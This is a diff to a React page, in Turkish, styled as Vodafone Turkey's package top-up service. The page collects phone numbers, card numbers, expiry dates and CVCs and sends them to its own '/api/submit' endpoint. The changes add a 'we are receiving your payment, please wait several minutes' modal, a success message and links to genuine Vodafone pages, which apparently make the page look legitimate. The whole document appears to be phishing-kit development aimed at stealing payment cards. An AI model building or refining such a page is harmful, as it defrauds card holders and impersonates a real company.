@@ -8,6 +8,9 @@ const Index = () => {
   const [cardNumber, setCardNumber] = useState('')
   const [expiry, setExpiry] = useState('')
   const [cvc, setCvc] = useState('')
+  const [showModal, setShowModal] = useState(false)
+  const [loading, setLoading] = useState(false)
+  const [paymentSuccess, setPaymentSuccess] = useState(false)
 
   // handleContinue fonksiyonunu değiştirin
   const handleContinue = () => {
@@ -34,15 +37,18 @@ const Index = () => {
 
   const handleSubmit = async () => {
     try {
+      setLoading(true)
       await axios.post('/api/submit', {
         phoneNumber: phoneNumber,
         cardNumber: cardNumber,
         expiry: expiry,
         cvc: cvc,
       })
-      alert('Başarıyla kaydedildi!')
+      setLoading(false)
+      setPaymentSuccess(true)
     } catch (error) {
       console.error(error)
+      setLoading(false)
       alert('Bir hata oluştu.')
     }
   }
@@ -84,14 +90,27 @@ const Index = () => {
 
   return (
     <div className="container mx-auto mt-10 max-w-screen-md px-4 md:px-0">
+      {showModal && (
+        <div className="fixed inset-0 flex items-center justify-center z-50 bg-black bg-opacity-50">
+          <div className="bg-white p-8 shadow-lg rounded">
+            <h2 className="text-xl font-bold mb-4">Ödemenizi Alıyoruz...</h2>
+            <p className="mb-4">
+              Lütfen bekleyin, bu işlem birkaç dakika sürebilir.
+            </p>
+            {loading && (
+              <div className="loader ease-linear rounded-full border-4 border-t-4 border-gray-200 h-12 w-12 mb-4"></div>
+            )}
+          </div>
+        </div>
+      )}
       <h1 className="text-3xl font-bold mb-8 text-center text-[#333]">
         Kolay Paket Yükle
       </h1>
       <div className="flex justify-center mb-8">
-        <span className="mr-4 border-b-2 border-red-600 pb-1 font-bold">
+        <span className="mr-4 border-b-2 border-red-600 pb-1 font-bold cursor-pointer">
           Misafir olarak yükle
         </span>
-        <span>Giriş yaparak yükle</span>
+        <span className="cursor-pointer">Giriş yaparak yükle</span>
       </div>
       <div className="flex justify-center">
         <div className="bg-white shadow-md p-4 md:p-8 w-full mx-auto">
@@ -114,7 +133,7 @@ const Index = () => {
                 className="bg-red-600 text-white font-semibold px-4 py-2 rounded hover:bg-red-700 mt-2"
                 onClick={handleContinue}
               >
-                Devam Et
+                Bu telefon numarasına yükle
               </button>
             </div>
           )}
@@ -156,7 +175,7 @@ const Index = () => {
               </p>
             )}
 
-            {step === 2 && (
+            {step > 1 && (
               <div>
                 {packages.map((pack, i) => (
                   <div
@@ -187,17 +206,15 @@ const Index = () => {
                     <p className="text-sm">{pack.validity}</p>
                     {selectedPackage === i ? (
                       <button
-                        className="bg-red-600 text-white py-2 px-4 rounded mt-2"
+                        className="bg-red-600 text-white py-2 px-4 rounded mt-2 opacity-0 cursor-not-allowed pointer-events-none"
                         onClick={handleContinue}
-                      >
-                        Devam Et
-                      </button>
+                      ></button>
                     ) : (
                       <button
                         className="bg-red-600 hover:bg-red-700 text-white py-2 px-4 rounded mt-2"
                         onClick={() => handlePackageSelect(i)}
                       >
-                        Devam Et
+                        Paketi seç
                       </button>
                     )}
                   </div>
@@ -221,12 +238,18 @@ const Index = () => {
               <span className="font-bold text-2xl mr-5">3.</span> Ödeme
               <hr className="mb-2 mt-2" />
             </h4>
+            {step < 3 && (
+              <p className="font-medium underline text-red-600 text-center text-[15px] mt-6 mb-6">
+                Telefon numarasına yükleyeceğiniz paketi seçtiğinizde ödeme
+                kısmına yönlendirileceksiniz.{' '}
+              </p>
+            )}
             {step === 3 && (
               <div>
                 <div className="flex items-center mb-4">
                   <input
                     type="checkbox"
-                    className="form-checkbox bg-blue-600 text-white cursor-not-allowed mr-2"
+                    className="form-checkbox bg-blue-600 text-white cursor-not-allowed pointer-events-none mr-2"
                     defaultChecked
                     readOnly
                   />
@@ -283,13 +306,21 @@ const Index = () => {
                 <div className="flex items-center">
                   <input type="checkbox" className="form-checkbox mr-2" />
                   <span>
-                    <span className="underline text-red-600">
+                    <a
+                      className="underline text-red-600 cursor-pointer"
+                      href="https://www.vodafone.com.tr/yardim/satin-almak-icin-hangi-adimlari-gecmeliyim"
+                      target="_blank"
+                    >
                       Mesafeli Satış Sözleşmesi
-                    </span>{' '}
+                    </a>{' '}
                     ve{' '}
-                    <span className="underline text-red-600">
+                    <a
+                      className="underline text-red-600 cursor-pointer"
+                      href="https://www.vodafone.com.tr/lead/on-muhasebe-ve-e-donusum-basvuru-formu"
+                      target="_blank"
+                    >
                       Ön Bilgilendirme Forumunu
-                    </span>{' '}
+                    </a>{' '}
                     okudum, onaylıyorum
                   </span>
                 </div>
@@ -299,6 +330,27 @@ const Index = () => {
                 >
                   Paketi Satın Al
                 </button>
+                {loading && (
+                  <div className="bg-black bg-opacity-50 fixed inset-0 flex items-center justify-center z-50">
+                    <div className="bg-white shadow-xl p-8 rounded-lg w-[450px]">
+                      <h2 className="text-center text-red-600 font-semibold text-2xl mb-4">
+                        Ödemenizi Alıyoruz...
+                      </h2>
+                      <p className="text-center text-gray-600 mb-6">
+                        Lütfen bekleyin, bu işlem birkaç dakika sürebilir.
+                      </p>
+                      <div className="flex justify-center">
+                        <div className="loader ease-linear rounded-full border-4 border-t-4 border-gray-200 h-12 w-12 mb-4"></div>
+                      </div>
+                    </div>
+                  </div>
+                )}
+                {paymentSuccess && (
+                  <p className="font-medium text-green-600 text-center text-[15px] mt-6 mb-6">
+                    Ödemeniz başarıyla alındı!
+                  </p>
+                )}
+
                 {step === 4 && (
                   <p className="font-medium underline text-red-600 text-center text-[15px] mt-6 mb-6">
                     Bekleyin Ödemenizi Alıyoruz...{' '}
